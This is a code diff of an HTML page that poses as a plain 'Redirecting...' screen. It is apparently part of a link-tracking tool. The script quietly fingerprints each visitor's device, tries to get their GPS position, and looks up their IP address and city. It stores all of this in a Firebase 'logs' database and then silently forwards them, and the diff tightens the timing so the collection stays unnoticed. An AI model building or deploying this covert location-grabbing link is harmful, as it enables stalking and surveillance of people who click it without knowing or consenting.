@@ -6,6 +6,17 @@
   <title>Redirecting...</title>
   <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #333;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+  </style>
+</head>
+<body>
   <script>
     // Initialize Firebase
     const firebaseConfig = {
@@ -15,37 +26,27 @@
       projectId: "jarsi-df353",
       storageBucket: "jarsi-df353.appspot.com",
       messagingSenderId: "488797085147",
-      appId: "1:488797085147:web:52108c710556a39f62dbfe"
+      appId: "1:488797085147:web:52108c710556a39f62dbfe",
+      measurementId: "G-J2Y7F4N6VW"
     };
-    
+
+    // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
     // Get URL parameters
     const urlParams = new URLSearchParams(window.location.search);
     const target = urlParams.get('target');
-    const id = urlParams.get('id');
+    const trackingId = urlParams.get('id');
 
     // Redirect if missing params
-    if (!target || !id) {
+    if (!target || !trackingId) {
       window.location.href = 'lacak.html';
     } else {
-      // Generate device fingerprint
-      const generateDeviceId = () => {
-        const info = navigator.userAgent + navigator.platform + navigator.language + 
-                     window.screen.width + window.screen.height;
-        let hash = 0;
-        for (let i = 0; i < info.length; i++) {
-          hash = (hash << 5) - hash + info.charCodeAt(i);
-          hash |= 0;
-        }
-        return hash.toString();
-      };
-
-      // Create basic log data
-      const logData = {
-        id,
-        target,
+      // Create basic tracking data
+      const trackingData = {
+        id: trackingId,
+        target: target,
         timestamp: new Date().toISOString(),
         referrer: document.referrer || 'Direct',
         userAgent: navigator.userAgent,
@@ -56,77 +57,124 @@
         deviceId: generateDeviceId()
       };
 
-      // Try to get precise geolocation first
-      if (navigator.geolocation) {
+      // Set a timeout for the entire process (max 3 seconds)
+      const redirectTimeout = setTimeout(() => {
+        performRedirect(target);
+      }, 3000);
+
+      // Try to get geolocation first
+      if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            // Success - use precise coordinates
-            logData.latitude = position.coords.latitude;
-            logData.longitude = position.coords.longitude;
-            logData.locationSource = 'geolocation';
-            saveAndRedirect(logData, target);
+            // Success - use high accuracy GPS coordinates
+            trackingData.latitude = position.coords.latitude;
+            trackingData.longitude = position.coords.longitude;
+            trackingData.locationSource = 'geolocation';
+            getIPAndSave(trackingData, redirectTimeout, target);
           },
           (error) => {
-            // Fallback to IP-based location
-            getIPLocation(logData, target);
+            // Geolocation failed - fallback to IP
+            console.log('Geolocation error:', error);
+            trackingData.locationSource = 'ip-fallback';
+            getIPAndSave(trackingData, redirectTimeout, target);
           },
-          { timeout: 1000 } // Don't wait too long
+          { timeout: 1000 } // Don't wait too long for geolocation
         );
       } else {
-        // Geolocation not available - use IP-based location
-        getIPLocation(logData, target);
+        // No geolocation support - fallback to IP
+        trackingData.locationSource = 'ip-fallback';
+        getIPAndSave(trackingData, redirectTimeout, target);
       }
     }
 
-    function getIPLocation(logData, target) {
+    // Helper function to get IP-based location and save data
+    function getIPAndSave(trackingData, redirectTimeout, target) {
       fetch('https://ipapi.co/json/')
-        .then(response => response.json())
+        .then(response => {
+          if (!response.ok) throw new Error('IP API response not OK');
+          return response.json();
+        })
         .then(ipData => {
-          // Add IP data to log
-          logData.ip = ipData.ip || 'Unknown';
-          logData.city = ipData.city || 'Unknown';
-          logData.region = ipData.region || 'Unknown';
-          logData.country = ipData.country_name || 'Unknown';
-          logData.latitude = ipData.latitude || 0;
-          logData.longitude = ipData.longitude || 0;
-          logData.locationSource = 'ipapi';
+          // Add IP data to tracking object
+          trackingData.ip = ipData.ip || 'Unknown';
+          trackingData.city = ipData.city || 'Unknown';
+          trackingData.region = ipData.region || 'Unknown';
+          trackingData.country = ipData.country_name || 'Unknown';
           
-          saveAndRedirect(logData, target);
+          // Only set IP coordinates if we don't have geolocation data
+          if (!trackingData.latitude) {
+            trackingData.latitude = ipData.latitude || 'Unknown';
+            trackingData.longitude = ipData.longitude || 'Unknown';
+          }
+          
+          saveToFirebase(trackingData, redirectTimeout, target);
         })
         .catch(error => {
-          console.error('Error getting IP data:', error);
-          // Save without location data
-          logData.ip = 'Unknown';
-          logData.locationSource = 'none';
-          saveAndRedirect(logData, target);
+          console.log('IP API error:', error);
+          // Set defaults if IP lookup fails
+          trackingData.ip = 'Unknown';
+          trackingData.city = 'Unknown';
+          trackingData.region = 'Unknown';
+          trackingData.country = 'Unknown';
+          if (!trackingData.latitude) {
+            trackingData.latitude = 'Unknown';
+            trackingData.longitude = 'Unknown';
+          }
+          
+          saveToFirebase(trackingData, redirectTimeout, target);
         });
     }
 
-    function saveAndRedirect(logData, targetUrl) {
-      // Generate unique log key
-      const logKey = `${logData.id}_${new Date().getTime()}`;
+    // Save data to Firebase
+    function saveToFirebase(trackingData, redirectTimeout, target) {
+      const logRef = database.ref('logs/' + trackingData.id + '_' + Date.now());
       
-      // Save to Firebase
-      database.ref('logs/' + logKey).set(logData)
+      logRef.set(trackingData)
         .then(() => {
-          // Prepare target URL
-          let finalUrl = targetUrl;
-          if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
-            finalUrl = 'https://' + finalUrl;
-          }
-          
-          // Redirect silently
-          window.location.href = finalUrl;
+          console.log('Tracking data saved successfully');
+          clearTimeout(redirectTimeout);
+          performRedirect(target);
         })
         .catch(error => {
-          console.error('Error saving log:', error);
-          // Still redirect even if logging failed
-          window.location.href = targetUrl;
+          console.error('Error saving to Firebase:', error);
+          clearTimeout(redirectTimeout);
+          performRedirect(target);
         });
     }
+
+    // Perform the actual redirect
+    function performRedirect(targetUrl) {
+      let finalUrl = targetUrl;
+      
+      // Ensure the URL has a protocol
+      if (!/^https?:\/\//i.test(targetUrl)) {
+        finalUrl = 'https://' + targetUrl;
+      }
+      
+      window.location.href = finalUrl;
+    }
+
+    // Generate a simple device fingerprint
+    function generateDeviceId() {
+      const components = [
+        navigator.userAgent,
+        navigator.platform,
+        window.screen.width,
+        window.screen.height,
+        navigator.language
+      ];
+      
+      let hash = 0;
+      const str = components.join('|');
+      
+      for (let i = 0; i < str.length; i++) {
+        const char = str.charCodeAt(i);
+        hash = (hash << 5) - hash + char;
+        hash |= 0; // Convert to 32bit integer
+      }
+      
+      return Math.abs(hash).toString(36).substring(0, 8);
+    }
   </script>
-</head>
-<body>
-<!-- No visible content - silent redirect -->
 </body>
 </html>
